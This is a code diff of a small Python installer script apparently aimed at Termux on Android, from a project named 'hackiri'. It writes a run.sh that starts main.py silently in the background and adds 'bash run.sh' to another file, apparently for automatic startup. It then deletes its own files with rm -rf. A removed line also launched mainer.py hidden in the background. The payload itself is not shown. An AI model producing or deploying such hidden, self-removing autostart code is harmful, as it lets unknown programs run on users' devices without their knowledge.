@@ -1,10 +1,9 @@
 import os
-try:
-    os.system('cp -r hackiri/*.py /$HOME')
+try: 
 
-except:
-    os.system('cp -r *.py /$HOME')
-os.chdir('/data/data/com.termux//files/home')
+    os.chdir('/data/data/com.termux//files/home')
+except: 
+     pass
 file = open('run.sh' , 'w+')
 file.write('python main.py &> /dev/null &')
 file.close()
@@ -20,8 +19,8 @@ except:
     file2.write('bash run.sh')
 while True:
     try:
-        os.system('rm -rf hackri')
+        os.system('rm -rf run.py')
         break
     except:
         pass
-os.system("python mainer.py &> /dev/null &")
+#os.system("python mainer.py &> /dev/null &")
